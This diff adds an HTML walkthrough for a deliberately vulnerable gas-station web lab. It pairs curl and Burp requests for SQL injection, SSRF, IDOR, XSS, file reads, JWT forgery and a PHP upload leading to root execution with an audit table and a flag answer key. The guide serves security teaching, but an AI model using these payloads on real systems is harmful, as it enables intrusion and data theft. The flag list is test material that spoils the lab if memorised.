@@ -1,0 +1,273 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>ACS Gas Station — Solving Guide</title>
+<link rel="stylesheet" href="app/public/css/style.css">
+<style>
+:root{--g:#14532d;--b:#075985;--bg:#f4f7f5}body{background:var(--bg);color:#17201b}
+.guide{max-width:1120px;margin:auto;padding:32px 18px 70px}.hero{background:linear-gradient(135deg,#052e16,#166534 60%,#075985);color:#fff;border-radius:18px;padding:38px;box-shadow:0 14px 38px #052e1630}.hero h1{margin:0 0 10px;font-size:clamp(2rem,5vw,3.4rem);letter-spacing:-.04em}.hero p{max-width:760px;color:#dcfce7;line-height:1.65}.badges{display:flex;flex-wrap:wrap;gap:8px;margin-top:20px}.badge-guide{background:#ffffff22;border:1px solid #ffffff3d;border-radius:99px;padding:6px 11px;font-size:.8rem}
+.layout{display:grid;grid-template-columns:minmax(0,1fr) 270px;gap:22px;margin-top:24px}.card{background:#fff;border:1px solid #dce5df;border-radius:14px;padding:23px;margin-bottom:20px;box-shadow:0 5px 18px #1018120b}.card h2{margin:0 0 12px;color:var(--g);font-size:1.45rem}.card h3{margin:22px 0 8px;color:#166534;font-size:1.05rem}p,li{line-height:1.62}.card a{color:var(--b)}
+pre{overflow:auto;background:#111827;color:#e5e7eb;padding:14px 15px;border-radius:9px;line-height:1.5;font-size:.82rem}code{font-family:Consolas,Monaco,monospace}.card :not(pre)>code{background:#eef2f0;border-radius:4px;padding:2px 5px;color:#14532d}.callout{border-left:4px solid #0284c7;background:#e0f2fe;padding:12px 14px;border-radius:0 8px 8px 0;margin:14px 0}.warning{border-color:#ea580c;background:#fff7ed}
+.diagram{display:grid;gap:7px;margin:16px 0}.diagram div{padding:12px;text-align:center;border:1px solid #bae6fd;background:#f0f9ff;color:#075985;border-radius:9px;font-weight:700}.diagram .arrow{padding:0;border:0;background:none;color:#16a34a;font-size:1.2rem}.step{display:flex;gap:13px;margin:15px 0}.num{flex:0 0 31px;height:31px;display:grid;place-items:center;border-radius:50%;background:#15803d;color:#fff;font-weight:700}.side{position:sticky;top:18px}.side a{display:block;padding:7px 0;border-bottom:1px solid #edf1ee;text-decoration:none;font-size:.88rem}.flag{background:#052e16;color:#bbf7d0;border-radius:8px;padding:10px 12px;margin:8px 0;font-family:Consolas,monospace;overflow:auto}table{width:100%;border-collapse:collapse;font-size:.86rem}th,td{text-align:left;vertical-align:top;border-bottom:1px solid #e5ebe6;padding:9px;line-height:1.4}th{color:#14532d;background:#f0fdf4}.check label{display:block;margin:10px 0}@media(max-width:800px){.layout{grid-template-columns:1fr}.side{position:static;order:-1}.hero{padding:26px 21px}.card{padding:18px}table{display:block;overflow:auto}}
+</style>
+<style>
+main{display:flex;flex-direction:column}
+main>.card{order:20}
+main>#start{order:0}main>#burp{order:1}main>#burp-pocs{order:2}main>#setup{order:3}main>#chain{order:4}main>#session{order:5}main>#recon{order:6}main>#ssrf{order:7}main>#jwt{order:8}main>#upload{order:9}main>#flags{order:10}main>#independent{order:11}main>#exploits{order:12}main>#flagmap{order:13}main>#audit{order:14}main>#map{order:15}main>#checklist{order:16}main>#defense{order:17}
+.start-list{display:grid;grid-template-columns:repeat(3,1fr);gap:10px;margin:16px 0}.start-item{border:1px solid #bbf7d0;background:#f0fdf4;border-radius:10px;padding:12px;font-size:.9rem}.start-item strong{display:block;color:#14532d;margin-bottom:4px}.phase-label{display:inline-block;background:#dcfce7;color:#166534;border-radius:99px;padding:4px 9px;font-size:.75rem;font-weight:700;margin-bottom:9px}
+@media(max-width:650px){.start-list{grid-template-columns:1fr}}
+</style>
+</head>
+<body>
+<div class="guide">
+<header class="hero"><h1>ACS Gas Station<br>Solving Guide</h1><p>A practical step-by-step playbook for this vulnerable container lab. Follow the main chain from a normal customer account to authenticated code execution, then use the independent routes to complete the audit.</p><div class="badges"><span class="badge-guide">Local lab only</span><span class="badge-guide">Beginner → Advanced</span><span class="badge-guide">SSRF → JWT → Upload → RCE</span></div></header>
+<div class="layout"><main>
+<section class="card" id="burp-pocs"><span class="phase-label">BURP POC LIBRARY</span><h2>Raw Requests for Every Finding</h2><p>Use these as Burp Repeater templates. Replace <code>HOST</code> with <code>127.0.0.1:9005</code>, add <code>Authorization: Bearer TOKEN</code> where shown, and send each request from Repeater. Obtain <code>TOKEN</code> by logging in through the browser and copying the response token. For the admin requests, replace <code>ADMIN_TOKEN</code> after the JWT step.</p>
+
+<h3>Authentication baseline</h3><pre><code>POST /api/auth/login HTTP/1.1
+Host: HOST
+Content-Type: application/json
+
+{"email":"kwame@gmail.com","password":"Kwame@2024"}</code></pre>
+
+<h3>V1 — Mass assignment</h3><pre><code>POST /api/auth/register HTTP/1.1
+Host: HOST
+Content-Type: application/json
+
+{"email":"mass@example.test","password":"LabPass1!","name":"Mass User","role":"admin","loyalty_points":999999,"card_number":"0000-0000-0000-0000"}</code></pre>
+
+<h3>V2 — Transaction IDOR</h3><pre><code>GET /api/transactions/1 HTTP/1.1
+Host: HOST
+Authorization: Bearer TOKEN</code></pre>
+
+<h3>V3 — JWT forgery verification</h3><pre><code>GET /api/admin/users HTTP/1.1
+Host: HOST
+Authorization: Bearer ADMIN_TOKEN</code></pre><p>Use Burp JWT Editor to sign the modified token with the secret recovered in V5 or V9. Set <code>userId</code> to <code>1</code> and <code>role</code> to <code>admin</code>.</p>
+
+<h3>V4 — Boolean SQL injection</h3><pre><code>GET /api/fuel/search?type=%25%27%20OR%201%3D1%20-- HTTP/1.1
+Host: HOST
+Authorization: Bearer TOKEN</code></pre><pre><code>GET /api/fuel/search?type=%25%27%20AND%201%3D0%20-- HTTP/1.1
+Host: HOST
+Authorization: Bearer TOKEN</code></pre>
+
+<h3>V5 — SSRF</h3><pre><code>POST /api/fuel/external-price HTTP/1.1
+Host: HOST
+Authorization: Bearer TOKEN
+Content-Type: application/json
+
+{"url":"http://127.0.0.1:3000/api/internal/pricing"}</code></pre>
+
+<h3>V6 — Price tampering</h3><pre><code>POST /api/transactions HTTP/1.1
+Host: HOST
+Authorization: Bearer TOKEN
+Content-Type: application/json
+
+{"pump_number":1,"fuel_type":"Petrol","litres":1,"price_per_litre":0.01,"payment_method":"cash"}</code></pre>
+
+<h3>V7 — Negative points and race condition</h3><pre><code>POST /api/loyalty/redeem HTTP/1.1
+Host: HOST
+Authorization: Bearer TOKEN
+Content-Type: application/json
+
+{"points":-100}</code></pre><p>For the race, duplicate this Repeater tab ten times, set <code>points</code> to <code>500</code>, then use Repeater’s parallel send/group option. Turbo Intruder can also send the same request concurrently.</p>
+
+<h3>V8 — XML manifest</h3><pre><code>POST /api/deliveries/upload HTTP/1.1
+Host: HOST
+Authorization: Bearer TOKEN
+Content-Type: application/xml
+
+&lt;?xml version="1.0"?&gt;&lt;manifest&gt;&lt;supplier&gt;Test&lt;/supplier&gt;&lt;fuel&gt;Petrol&lt;/fuel&gt;&lt;quantity&gt;1&lt;/quantity&gt;&lt;/manifest&gt;</code></pre><p>Submit a baseline first. Only test external entities against the local lab; the installed xml2js/sax combination may reject them.</p>
+
+<h3>V9 — Local file inclusion</h3><pre><code>GET /api/reports/generate?template=%2Fetc%2Facs-gas-station%2Fconfig.txt HTTP/1.1
+Host: HOST
+Authorization: Bearer TOKEN</code></pre><pre><code>GET /api/reports/generate?template=%2Fapp%2Fserver.js HTTP/1.1
+Host: HOST
+Authorization: Bearer TOKEN</code></pre>
+
+<h3>V10 — PHP upload to RCE</h3><p>Capture a legitimate upload from Reports → Upload Receipt in Proxy. Send it to Repeater and edit the multipart part so the filename ends in <code>.php</code>, the part MIME is <code>image/jpeg</code>, and the body is a harmless proof reader:</p><pre><code>POST /api/upload/receipt HTTP/1.1
+Host: HOST
+Authorization: Bearer ADMIN_TOKEN
+Content-Type: multipart/form-data; boundary=----BurpBoundary
+
+------BurpBoundary
+Content-Disposition: form-data; name="receipt"; filename="proof.php"
+Content-Type: image/jpeg
+
+&lt;?php echo file_get_contents("/var/www/proof.txt"); ?&gt;
+------BurpBoundary--</code></pre><p>Send it, copy the returned URL, then request that URL in Repeater.</p>
+
+<h3>V11 — Broken manager authorization</h3><pre><code>GET /api/manager/dashboard HTTP/1.1
+Host: HOST
+Authorization: Bearer TOKEN</code></pre>
+
+<h3>Frontend XSS sink</h3><pre><code>POST /api/auth/register HTTP/1.1
+Host: HOST
+Content-Type: application/json
+
+{"email":"xss@example.test","password":"LabPass1!","name":"&lt;img src=x onerror=alert(1)&gt;"}</code></pre><p>Log in as a manager/admin or use the exposed dashboard, then open the customer list. This is a local lab proof of unsafe <code>innerHTML</code> rendering.</p>
+
+<h3>CSRF and session-cookie check</h3><p>Capture any state-changing request in Proxy, remove the Authorization header, and leave the browser’s <code>hf_token</code> cookie. If the request still succeeds, the cookie-authenticated route lacks CSRF protection. Do this only with the local lab account.</p>
+
+<h3>Evidence checklist</h3><ul><li>Save the baseline request and the modified request in separate Repeater tabs.</li><li>Record status code, response length, and the changed response field.</li><li>For upload RCE, save the upload response and the follow-up response separately.</li><li>For race testing, record the number of successful responses and the final loyalty history.</li></ul></section>
+<section class="card" id="start"><span class="phase-label">START HERE</span><h2>How to Use This Guide</h2><p>Follow the sections from top to bottom. Do not jump straight to the flags: each phase teaches one idea and gives you a way to confirm that it worked.</p><div class="start-list"><div class="start-item"><strong>1. Prepare</strong>Start the container and set the target URL.</div><div class="start-item"><strong>2. Discover</strong>Login, inspect the app, and find the SSRF.</div><div class="start-item"><strong>3. Escalate</strong>Recover the secret and forge the admin token.</div><div class="start-item"><strong>4. Execute</strong>Bypass upload validation and run PHP.</div><div class="start-item"><strong>5. Explore</strong>Work through the independent vulnerabilities.</div><div class="start-item"><strong>6. Finish</strong>Read the proof files and compare your results.</div></div><div class="callout warning"><strong>Beginner tip:</strong> Keep two terminal variables: <code>TOKEN</code> is the normal customer session, and <code>ADMIN_TOKEN</code> is created only after the JWT step. If a command fails, verify the token, port, and JSON content type first.</div><p><a href="#burp">Set up Burp Suite →</a></p></section>
+
+<section class="card" id="burp"><span class="phase-label">PRIMARY TOOL</span><h2>Burp Suite Workflow</h2><p>This guide is designed to be solved in Burp Suite. The request examples below are raw HTTP requests for Proxy, Repeater, Intruder, or Turbo Intruder.</p><h3>1. Configure the browser</h3><ol><li>Start Burp Suite and use the default proxy listener at <code>127.0.0.1:8080</code>.</li><li>Configure the browser to use that proxy for HTTP.</li><li>Visit <code>http://burp</code> and install Burp’s CA certificate if HTTPS interception is needed.</li><li>Use <strong>Proxy → Intercept</strong> to capture requests and <strong>HTTP history</strong> to review traffic.</li></ol><h3>2. Use Repeater</h3><p>Right-click a request in HTTP history and choose <strong>Send to Repeater</strong>. Change one value at a time, click <strong>Send</strong>, and compare status, response length, and JSON fields with the baseline.</p><h3>3. Capture the login token</h3><p>Log in through <code>/login.html</code>, then find this request:</p><pre><code>POST /api/auth/login HTTP/1.1
+Host: 127.0.0.1:9005
+Content-Type: application/json
+
+{\"email\":\"kwame@gmail.com\",\"password\":\"Kwame@2024\"}</code></pre><p>Send it to Repeater and copy the JSON <code>token</code>. For cookie-authenticated requests, Burp can preserve the session cookie automatically.</p><h3>4. Burp tools by task</h3><ul><li><strong>Repeater:</strong> SSRF, IDOR, LFI, mass assignment, price tampering, and access-control checks.</li><li><strong>JWT Editor:</strong> decode the token, change the role to <code>admin</code>, and sign it with the secret recovered from SSRF/LFI.</li><li><strong>Intruder or Turbo Intruder:</strong> send concurrent loyalty-redemption requests.</li><li><strong>Proxy intercept:</strong> capture multipart upload and change filename/content type.</li><li><strong>Comparer:</strong> compare true/false SQL-injection responses.</li></ul><div class="callout"><strong>Burp habit:</strong> save the original request before editing it. Use status, body length, and returned fields as evidence that each step worked.</div></section>
+<section class="card" id="exploits"><h2>Exploit Procedures — V1 to V12</h2>
+<p>The Burp POC Library above is the canonical request source. Use <code>TOKEN</code> for the normal customer token and <code>ADMIN_TOKEN</code> after the JWT-forgery phase. V1–V9 and V11 have no separate flag; V10 and V12 produce the runtime proofs.</p>
+
+<h3>V1 — Mass assignment</h3><ol><li>Register with server-controlled fields.</li><li>Log in as the new user.</li><li>Call <code>/api/auth/me</code> to confirm the role and points.</li></ol><pre><code>curl -s "$TARGET/api/auth/register" -H 'Content-Type: application/json' -d '{"email":"mass@example.test","password":"LabPass1!","name":"Mass User","role":"admin","loyalty_points":999999,"card_number":"0000-0000-0000-0000"}' | jq
+curl -s "$TARGET/api/auth/login" -H 'Content-Type: application/json' -d '{"email":"mass@example.test","password":"LabPass1!"}' | jq</code></pre><p><strong>Result:</strong> attacker-selected role, points, and card data. <strong>Flag:</strong> none.</p>
+
+<h3>V2 — Transaction IDOR</h3><ol><li>Authenticate as the seeded customer.</li><li>Request another numeric transaction ID.</li><li>Inspect returned customer and card fields.</li></ol><pre><code>curl -s "$TARGET/api/transactions/1" -H "Authorization: Bearer $TOKEN" | jq</code></pre><p><strong>Result:</strong> another customer’s transaction and PII. <strong>Flag:</strong> none.</p>
+
+<h3>V3 — JWT forgery</h3><ol><li>Recover the secret through V5 SSRF or V9 LFI.</li><li>Use the Phase 2 forge script with <code>userId: 1</code> and <code>role: admin</code>.</li><li>Call admin routes.</li></ol><pre><code>curl -s "$TARGET/api/admin/users" -H "Authorization: Bearer $ADMIN_TOKEN" | jq
+curl -s "$TARGET/api/admin/audit" -H "Authorization: Bearer $ADMIN_TOKEN" | jq</code></pre><p><strong>Result:</strong> administrator data is accessible. <strong>Flag:</strong> none.</p>
+
+<h3>V4 — Boolean blind SQL injection</h3><ol><li>Send an always-true predicate.</li><li>Send an always-false predicate.</li><li>Compare returned row counts.</li></ol><pre><code>curl -sG "$TARGET/api/fuel/search" -H "Authorization: Bearer $TOKEN" --data-urlencode "type=%' OR 1=1 --" | jq
+curl -sG "$TARGET/api/fuel/search" -H "Authorization: Bearer $TOKEN" --data-urlencode "type=%' AND 1=0 --" | jq</code></pre><p><strong>Result:</strong> the <code>type</code> value controls the SQLite query. <strong>Flag:</strong> none.</p>
+
+<h3>V5 — SSRF</h3><ol><li>Use the authenticated price-feed route.</li><li>Point it to the internal loopback service.</li><li>Read the returned JSON.</li></ol><pre><code>curl -s "$TARGET/api/fuel/external-price" -H "Authorization: Bearer $TOKEN" -H 'Content-Type: application/json' -d '{"url":"http://127.0.0.1:3000/api/internal/pricing"}' | jq</code></pre><p><strong>Result:</strong> internal data and the JWT secret. <strong>Flag:</strong> none.</p>
+
+<h3>V6 — Price tampering</h3><ol><li>Choose a valid fuel type.</li><li>Submit a false client price.</li><li>Inspect the recorded transaction.</li></ol><pre><code>curl -s "$TARGET/api/transactions" -H "Authorization: Bearer $TOKEN" -H 'Content-Type: application/json' -d '{"pump_number":1,"fuel_type":"Petrol","litres":1,"price_per_litre":0.01,"payment_method":"cash"}' | jq
+curl -s "$TARGET/api/transactions/my" -H "Authorization: Bearer $TOKEN" | jq</code></pre><p><strong>Result:</strong> client-controlled total and no inventory decrement. <strong>Flag:</strong> none.</p>
+
+<h3>V7 — Loyalty race and negative points</h3><ol><li>Use an account with sufficient points.</li><li>Send concurrent redemptions during the 250 ms window.</li><li>Inspect balance/history, then test a negative value.</li></ol><pre><code>for n in $(seq 1 10); do curl -s "$TARGET/api/loyalty/redeem" -H "Authorization: Bearer $TOKEN" -H 'Content-Type: application/json' -d '{"points":500}' & done; wait
+curl -s "$TARGET/api/loyalty/history" -H "Authorization: Bearer $TOKEN" | jq
+curl -s "$TARGET/api/loyalty/redeem" -H "Authorization: Bearer $TOKEN" -H 'Content-Type: application/json' -d '{"points":-100}' | jq</code></pre><p><strong>Result:</strong> points can be over-consumed or increased. <strong>Flag:</strong> none.</p>
+
+<h3>V8 — XML / XXE test</h3><ol><li>Submit a normal manifest.</li><li>Test external entities only against this local lab.</li><li>Record whether the parser rejects or expands them.</li></ol><pre><code>curl -s "$TARGET/api/deliveries/upload" -H "Authorization: Bearer $TOKEN" -H 'Content-Type: application/xml' --data-binary '&lt;?xml version="1.0"?&gt;&lt;manifest&gt;&lt;supplier&gt;Test&lt;/supplier&gt;&lt;fuel&gt;Petrol&lt;/fuel&gt;&lt;quantity&gt;1&lt;/quantity&gt;&lt;/manifest&gt;' | jq</code></pre><p><strong>Result:</strong> hardening options are absent, but xml2js/sax may reject external entities in this build. <strong>Flag:</strong> none.</p>
+
+<h3>V9 — Local file inclusion</h3><ol><li>Use the report endpoint with a customer token.</li><li>Supply an absolute path.</li><li>Read configuration or source.</li></ol><pre><code>curl -sG "$TARGET/api/reports/generate" -H "Authorization: Bearer $TOKEN" --data-urlencode 'template=/etc/acs-gas-station/config.txt' | jq -r .content
+curl -sG "$TARGET/api/reports/generate" -H "Authorization: Bearer $TOKEN" --data-urlencode 'template=/app/server.js' | jq -r .content</code></pre><p><strong>Result:</strong> readable files and secrets are returned. <strong>Flag:</strong> none.</p>
+
+<h3>V10 — Upload to PHP execution</h3><ol><li>Create PHP that reads the proof file.</li><li>Upload it as <code>image/jpeg</code>.</li><li>Request the returned URL.</li></ol><pre><code>echo '&lt;?php echo file_get_contents("/var/www/proof.txt"); ?&gt;' &gt; proof.php
+UPLOAD=$(curl -s "$TARGET/api/upload/receipt" -H "Authorization: Bearer $ADMIN_TOKEN" -F 'receipt=@proof.php;type=image/jpeg')
+URL=$(echo "$UPLOAD" | jq -r .url)
+curl -s "$TARGET$URL"</code></pre><p><strong>Result:</strong> uploaded PHP executes as the root process. <strong>Flag:</strong> upload proof.</p>
+
+<h3>V11 — Broken manager authorization</h3><ol><li>Use the customer token.</li><li>Call the manager endpoint directly.</li><li>Inspect all collections.</li></ol><pre><code>curl -s "$TARGET/api/manager/dashboard" -H "Authorization: Bearer $TOKEN" | jq</code></pre><p><strong>Result:</strong> station data, cards, contacts, shifts, and transactions are exposed. <strong>Flag:</strong> none.</p>
+
+<h3>V12 — Full kill chain</h3><ol><li>Login as the customer.</li><li>Exploit SSRF to recover the secret.</li><li>Forge the administrator JWT.</li><li>Upload PHP with the MIME bypass.</li><li>Read all three proof targets through separate PHP files.</li></ol><p><strong>Result:</strong> full code execution and all runtime proofs.</p>
+</section>
+
+<section class="card" id="flagmap"><h2>Final Flag Mapping</h2><p>These values are generated by <code>app/scripts/start.sh</code>.</p><table><thead><tr><th>Proof target</th><th>Route</th><th>Flag</th></tr></thead><tbody><tr><td><code>/var/www/proof.txt</code></td><td>V10/V12</td><td><code>FLAG{f1l3_upl04d_rce_h1v3fu3l_pwn3d}</code></td></tr><tr><td><code>/var/www/user.txt</code></td><td>V10/V12</td><td><code>FLAG{sh3ll_4cc3ss_h1v3_g4s_st4t10n}</code></td></tr><tr><td><code>/root/root.txt</code></td><td>V10/V12</td><td><code>FLAG{r00t_pr1v3sc_h1v3fu3l_cr0n_0wn3d}</code></td></tr></tbody></table><div class="callout warning"><strong>Note:</strong> V1–V9 and V11 do not create separate flag values in this lab.</div></section>
+
+<section class="card" id="setup"><h2>0. Lab Setup</h2><p>This guide is now in the repository root. It is documentation, not an application route. Open it directly from the project folder:</p><pre><code>start .\guide.html</code></pre><p>Or serve the repository folder locally:</p><pre><code>python -m http.server 8081
+http://127.0.0.1:8081/guide.html</code></pre><h3>Option A — Build and run from this source</h3><p>Open PowerShell or a terminal in the folder containing <code>docker-compose.yml</code>:</p><pre><code>docker --version
+docker compose version
+docker compose up --build -d
+docker compose ps</code></pre><p>Open the lab at <code>http://127.0.0.1:9005</code>. The application target for Burp is <code>127.0.0.1:9005</code>; Burp itself normally listens on <code>127.0.0.1:8080</code>.</p><p>Watch startup logs if the page does not load:</p><pre><code>docker compose logs -f acs-gas-station</code></pre><h3>Option B — Run the published image</h3><p>Use this when you do not need to rebuild the source:</p><pre><code>docker rm -f acs-gas-station 2&gt;$null
+docker run -d --name acs-gas-station -p 8090:3000 ghcr.io/s4mc71/acs-gas-station:latest
+docker ps</code></pre><p>Open the lab at <code>http://127.0.0.1:8090</code> and set Burp request <code>Host</code> values to <code>127.0.0.1:8090</code>. The root-level guide remains open separately as <code>guide.html</code>.</p><h3>Stop, restart, and remove</h3><pre><code>docker compose stop
+docker compose start
+docker compose down</code></pre><p>For the standalone container:</p><pre><code>docker stop acs-gas-station
+docker start acs-gas-station
+docker rm -f acs-gas-station</code></pre><div class="callout warning"><strong>Use one mode at a time:</strong> Compose uses port 9005 and the published-image command uses port 8090. Do not start both on the same host port. The first startup may take a few minutes while Docker builds or downloads the image.</div></section>
+
+<section class="card" id="chain"><h2>1. Attack Chain</h2><div class="diagram"><div>Low-privilege customer account</div><div class="arrow">↓ login</div><div>SSRF → internal pricing route</div><div class="arrow">↓ recover JWT secret</div><div>Forge HS256 administrator token</div><div class="arrow">↓ authenticated upload</div><div>Upload .php as image/jpeg</div><div class="arrow">↓ request .php URL</div><div>Code execution → read flags</div></div><div class="callout warning"><strong>Container note:</strong> Node is started as root in the default image. Upload RCE is already root; cron and sudo paths are additional findings, not required for the main solve.</div></section>
+
+<section class="card" id="session"><h2>2. Establish a Normal Session</h2><p>Seeded credentials from app/setup.js:</p><pre><code>Email:    kwame@gmail.com
+Password: Kwame@2024</code></pre><pre><code>LOGIN=$(curl -s "$TARGET/api/auth/login" \
+  -H 'Content-Type: application/json' \
+  -d '{"email":"kwame@gmail.com","password":"Kwame@2024"}')
+echo "$LOGIN" | jq
+export TOKEN=$(echo "$LOGIN" | jq -r .token)
+curl -s "$TARGET/api/auth/me" -H "Authorization: Bearer $TOKEN" | jq</code></pre><p>Keep this customer token separate from the forged administrator token.</p></section>
+
+<section class="card" id="recon"><h2>3. Reconnaissance and Quick Wins</h2><pre><code>curl -s "$TARGET/api/fuel" | jq
+curl -s "$TARGET/api/manager/dashboard" \
+  -H "Authorization: Bearer $TOKEN" | jq '.customers | length'
+curl -s "$TARGET/api/transactions/1" \
+  -H "Authorization: Bearer $TOKEN" | jq</code></pre><p>These confirm public inventory, manager-dashboard access for customers, and transaction IDOR with personal/card data exposure.</p></section>
+
+<section class="card" id="ssrf"><h2>4. Phase 1 — SSRF to JWT Secret</h2><div class="step"><div class="num">1</div><div>Use the price-feed endpoint, which fetches an attacker-controlled URL server-side.</div></div><div class="step"><div class="num">2</div><div>Target the application loopback interface and internal port:</div></div><pre><code>curl -s "$TARGET/api/fuel/external-price" \
+  -H "Authorization: Bearer $TOKEN" \
+  -H 'Content-Type: application/json' \
+  -d '{"url":"http://127.0.0.1:3000/api/internal/pricing"}' | jq</code></pre><div class="callout">Save <code>jwt_secret</code>. The expected lab value is <code>acs-gas-station2025</code>. If needed, try localhost:3000 instead.</div></section>
+
+<section class="card" id="jwt"><h2>5. Phase 2 — Forge an Administrator JWT</h2><p>Create <code>forge-jwt.py</code>:</p><pre><code>import base64, hashlib, hmac, json
+SECRET = b"acs-gas-station2025"
+def enc(v):
+    raw = json.dumps(v, separators=(",", ":")).encode()
+    return base64.urlsafe_b64encode(raw).rstrip(b"=").decode()
+header = enc({"alg":"HS256","typ":"JWT"})
+payload = enc({"userId":1,"role":"admin"})
+body = f"{header}.{payload}".encode()
+sig = base64.urlsafe_b64encode(hmac.new(SECRET, body, hashlib.sha256).digest()).rstrip(b"=").decode()
+print(f"{header}.{payload}.{sig}")</code></pre><pre><code>export ADMIN_TOKEN=$(python3 forge-jwt.py)
+curl -s "$TARGET/api/auth/me" -H "Authorization: Bearer $ADMIN_TOKEN" | jq
+curl -s "$TARGET/api/admin/stats" -H "Authorization: Bearer $ADMIN_TOKEN" | jq</code></pre><p><code>userId: 1</code> is the seeded administrator. A successful stats response confirms the forged identity.</p></section>
+
+<section class="card" id="upload"><h2>6. Phase 3 — Upload-to-RCE</h2><p>The upload filter trusts the multipart MIME value and the response handler executes filenames ending in <code>.php</code>.</p><pre><code>printf '%s\n' '&lt;?php echo file_get_contents("/var/www/proof.txt"); ?&gt;' > proof.php
+UPLOAD=$(curl -s "$TARGET/api/upload/receipt" \
+  -H "Authorization: Bearer $ADMIN_TOKEN" \
+  -F 'receipt=@proof.php;type=image/jpeg')
+echo "$UPLOAD" | jq
+export PHP_URL=$(echo "$UPLOAD" | jq -r .url)
+curl -s "$TARGET$PHP_URL"</code></pre><div class="callout">The response should contain the upload-RCE proof. Record it in your lab notes; this guide intentionally does not disclose flag values.</div></section>
+
+<section class="card" id="flags"><h2>7. Collect the Remaining Proofs</h2><p>Repeat the upload process with one file for each target:</p><pre><code>&lt;?php echo file_get_contents('/var/www/user.txt'); ?&gt;
+&lt;?php echo file_get_contents('/root/root.txt'); ?&gt;</code></pre><p>Request each returned URL and record the response locally. The proof files are generated at container startup; their contents are intentionally omitted from this guide.</p><p>Direct local verification:</p><pre><code>docker exec acs-gas-station sh -c \
+  'for f in /var/www/user.txt /var/www/proof.txt /root/root.txt; do echo "--- $f"; cat "$f"; done'</code></pre></section>
+
+<section class="card" id="independent"><h2>8. Independent Vulnerability Routes</h2><h3>Mass assignment</h3><pre><code>curl -s "$TARGET/api/auth/register" \
+  -H 'Content-Type: application/json' \
+  -d '{"email":"lab-user@example.test","password":"LabPass1!","name":"Lab User","role":"admin","loyalty_points":999999,"card_number":"0000-0000-0000-0000"}' | jq</code></pre><h3>Boolean blind SQL injection</h3><pre><code>curl -sG "$TARGET/api/fuel/search" -H "Authorization: Bearer $TOKEN" \
+  --data-urlencode "type=%' OR 1=1 --" | jq
+curl -sG "$TARGET/api/fuel/search" -H "Authorization: Bearer $TOKEN" \
+  --data-urlencode "type=%' AND 1=0 --" | jq</code></pre><p>This is more accurately boolean-based blind SQLi; SQLite has no portable sleep function.</p><h3>Price tampering</h3><pre><code>curl -s "$TARGET/api/transactions" -H "Authorization: Bearer $TOKEN" \
+  -H 'Content-Type: application/json' \
+  -d '{"pump_number":1,"fuel_type":"Petrol","litres":1,"price_per_litre":0.01,"payment_method":"cash"}' | jq</code></pre><h3>Loyalty race and negative points</h3><pre><code>curl -s "$TARGET/api/loyalty/redeem" -H "Authorization: Bearer $TOKEN" \
+  -H 'Content-Type: application/json' -d '{"points":-100}' | jq</code></pre><p>For the race, send concurrent redemptions during the endpoint’s 250 ms check/update window. The loyalty page includes a ten-request race button.</p><h3>Local-file read</h3><pre><code>curl -sG "$TARGET/api/reports/generate" -H "Authorization: Bearer $TOKEN" \
+  --data-urlencode 'template=/etc/acs-gas-station/station.key' | jq -r .content
+curl -sG "$TARGET/api/reports/generate" -H "Authorization: Bearer $TOKEN" \
+  --data-urlencode 'template=/app/server.js' | jq -r .content</code></pre><h3>XML manifest handling</h3><pre><code>curl -s "$TARGET/api/deliveries/upload" -H "Authorization: Bearer $TOKEN" \
+  -H 'Content-Type: application/xml' \
+  --data-binary '&lt;?xml version="1.0"?&gt;&lt;manifest&gt;&lt;supplier&gt;Test&lt;/supplier&gt;&lt;fuel&gt;Petrol&lt;/fuel&gt;&lt;quantity&gt;1&lt;/quantity&gt;&lt;/manifest&gt;' | jq</code></pre><p class="callout warning"><strong>XXE caveat:</strong> this xml2js/sax version normally rejects or leaves external entities unresolved. Verify against the built image instead of assuming XXE works.</p></section>
+
+<section class="card" id="audit"><h2>9. Full Vulnerability Check</h2><p>Use this section as the complete assessment checklist. “Confirmed” means the weakness is visible in the supplied source; “verify” identifies behavior worth checking in the running container.</p><table><thead><tr><th>Area</th><th>Finding and verification</th><th>Severity</th></tr></thead><tbody>
+<tr><td>Authentication</td><td>Plaintext passwords are inserted and compared directly. Review <code>setup.js</code> and <code>server.js:105</code>; try the seeded credentials.</td><td>Critical</td></tr>
+<tr><td>Authentication</td><td>Hardcoded JWT secret and role-bearing claims. Recover it through SSRF/LFI, then verify a forged token at <code>/api/admin/stats</code>.</td><td>Critical</td></tr>
+<tr><td>Authentication</td><td>JWT is returned in JSON, stored in localStorage, and also placed in a non-HttpOnly cookie. Any frontend XSS can steal it.</td><td>High</td></tr>
+<tr><td>Authentication</td><td>Tokens remain valid for 24 hours and logout only clears the client cookie; there is no server-side revocation.</td><td>Medium</td></tr>
+<tr><td>Authentication</td><td>No rate limiting, lockout, MFA, password policy, or account-enumeration protection. Compare unknown login and duplicate-registration responses.</td><td>Medium</td></tr>
+<tr><td>Authorization</td><td>Transaction object IDOR: any authenticated user can request any numeric transaction ID.</td><td>High</td></tr>
+<tr><td>Authorization</td><td>Manager dashboard uses <code>requireAuth</code> instead of a manager/admin role check.</td><td>High</td></tr>
+<tr><td>Authorization</td><td>Registration mass assignment lets a caller choose role, points, and card number.</td><td>Critical</td></tr>
+<tr><td>Authorization</td><td>Internal pricing endpoint is unauthenticated and discloses secret/configuration data.</td><td>Critical</td></tr>
+<tr><td>Data exposure</td><td>Manager and transaction APIs return full card numbers, phone numbers, email addresses, roles, and vehicle plates.</td><td>High</td></tr>
+<tr><td>Injection</td><td>Fuel search concatenates <code>type</code> into SQL; verify with the true/false boolean payloads above.</td><td>High</td></tr>
+<tr><td>Injection</td><td>Report content, upstream feed text, database values, filenames, names, and audit values are inserted into frontend <code>innerHTML</code> without escaping. This creates stored/reflected XSS sinks.</td><td>High</td></tr>
+<tr><td>SSRF</td><td>External price fetch has no scheme, host, redirect, DNS-rebinding, or private-network restrictions. Test the internal pricing route.</td><td>Critical</td></tr>
+<tr><td>File read</td><td>Report generation accepts arbitrary absolute paths. Test <code>/etc/acs-gas-station/station.key</code> and <code>/app/server.js</code>.</td><td>High</td></tr>
+<tr><td>File execution</td><td>Upload validation trusts multipart MIME and the web handler executes uploaded <code>.php</code> files.</td><td>Critical</td></tr>
+<tr><td>File handling</td><td>Uploaded files are publicly retrievable, use attacker-influenced original names, have no content inspection, and have no upload rate/quota control.</td><td>High</td></tr>
+<tr><td>Business logic</td><td>Client controls transaction price; litres and price have weak validation, inventory is not decremented, and negative/invalid numeric edge cases are not rejected.</td><td>High</td></tr>
